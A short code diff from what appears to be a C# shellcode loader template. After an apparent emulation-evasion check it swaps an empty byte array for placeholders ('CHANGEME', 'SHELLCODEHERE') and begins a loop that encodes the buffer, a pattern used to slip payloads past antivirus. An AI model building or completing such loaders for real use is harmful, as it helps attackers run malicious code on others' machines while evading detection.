@@ -257,7 +257,8 @@ namespace Met
 
         }
         Console.WriteLine("API Emulation done!");
-        byte[] buf = new byte[770] { };
+	
+        byte[] buf = new byte[CHANGEME] {SHELLCODEHERE};
     
         byte[] encoded = new byte[buf.Length];
         for (int i = 0; i < buf.Length; i++)
